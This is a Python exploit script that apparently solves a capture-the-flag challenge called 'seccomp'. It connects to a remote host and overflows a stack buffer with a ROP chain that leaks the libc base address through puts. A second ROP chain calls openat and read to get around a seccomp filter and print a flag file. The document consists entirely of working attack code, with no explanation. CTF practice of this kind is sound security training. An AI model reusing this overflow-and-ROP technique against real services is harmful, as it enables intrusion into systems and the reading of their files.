from ptrlib import *

elf = ELF("./seccomp")
"""
sock = Process("./seccomp")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
"""
sock = Socket("211.239.124.246", 12403)
#sock = Socket("0.0.0.0", 9999)
libc = ELF("./libc.so.6")
#"""

rop_pop_rdi = 0x00400eb3

# libc leak
payload = b'A' * 0x118
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))
payload += p64(elf.symbol("main"))
sock.sendlineafter(": ", "1")
sock.sendafter(": ", "1")
sock.sendlineafter(": ", "1")
sock.sendafter(": ", payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

"""
rop_xchg_eax_ecx = libc_base + 0x000f574b
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rax = libc_base + 0x000439c7
rop_xchg_eax_edi = libc_base + 0x0006eacd
rop_pop_rcx_rbx = libc_base + 0x00103cca
"""
rop_xchg_eax_ecx = libc_base + 0x00107ae3
rop_pop_rdx = libc_base + 0x00001b92
rop_pop_rsi = libc_base + 0x000202e8
rop_pop_rax = libc_base + 0x00033544
rop_xchg_eax_edi = libc_base + 0x000f68bc
rop_pop_rcx_rbx = libc_base + 0x000ea69a
#"""

# get the flag
payload = b'A' * 0x118
payload += p64(rop_pop_rdx)
payload += p64(0x20)
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("adult") + 1)
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(elf.plt("read"))

payload += p64(rop_pop_rsi)
payload += p64(libc_base + next(libc.find("r\0")))
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("adult") + 1)
payload += p64(rop_pop_rdi)
payload += p64((0xffffffffffffffff ^ 100) + 1)
payload += p64(libc_base + libc.symbol("openat"))

#payload += p64(rop_pop_rcx_rbx)
#payload += p64(elf.symbol("adult"))
#payload += p64(0xdeadbeef)
#payload += p64(rop_xchg_eax_edi)
payload += p64(rop_pop_rdi)
payload += p64(3) # cheat
payload += p64(rop_pop_rdx)
payload += p64(0x100)
payload += p64(rop_pop_rsi)
payload += p64(elf.section(".bss") + 0x400)
payload += p64(libc_base + libc.symbol("read"))

payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss") + 0x400)
payload += p64(elf.plt("puts"))

payload += p64(elf.symbol("_start"))
payload += b'a' * (0x200 - len(payload))
sock.sendlineafter(": ", "+")
sock.sendafter(": ", " flag")
sock.sendlineafter(": ", "1")
sock.sendafter(": ", payload)

sock.send("/home/seccomp/flag")
#sock.send("./flag.txt")

sock.interactive()
